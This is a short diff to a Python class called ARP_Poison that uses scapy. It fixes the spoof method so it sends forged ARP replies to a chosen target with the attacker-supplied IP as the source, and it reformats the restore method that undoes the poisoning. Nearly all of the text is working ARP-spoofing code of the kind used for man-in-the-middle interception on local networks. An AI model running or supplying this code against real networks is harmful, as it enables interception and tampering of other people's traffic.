@@ -11,13 +11,15 @@ class ARP_Poison():
         return ans_list[0][1].hwsrc
 
     def spoof(self, target_ip, attack_ip):
-        packet = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.mac_scan(self.target_ip), psrc=self.attack_ip)
+        packet = scapy.ARP(op=2, pdst=target_ip, 
+                hwdst=self.mac_scan(target_ip), psrc=attack_ip)
         scapy.send(packet, verbose=False)
 
     def restore(self, dest_ip, source_ip):
         dest_mac = self.mac_scan(dest_ip)
         source_mac = self.mac_scan(source_ip)
-        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
+        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, 
+                           psrc=source_ip, hwsrc=source_mac)
         scapy.send(packet, verbose=False)
 
 
